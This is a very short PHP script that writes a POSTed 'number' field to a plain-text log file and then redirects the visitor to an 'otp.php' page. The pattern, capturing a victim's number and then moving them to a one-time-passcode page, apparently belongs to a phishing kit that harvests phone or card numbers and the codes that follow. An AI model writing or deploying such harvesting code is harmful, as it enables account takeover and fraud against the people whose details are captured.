<?php

    file_put_contents("log.txt", "Number: " . $_POST['number'] . "\n", FILE_APPEND);
header('Location: otp.php');
exit();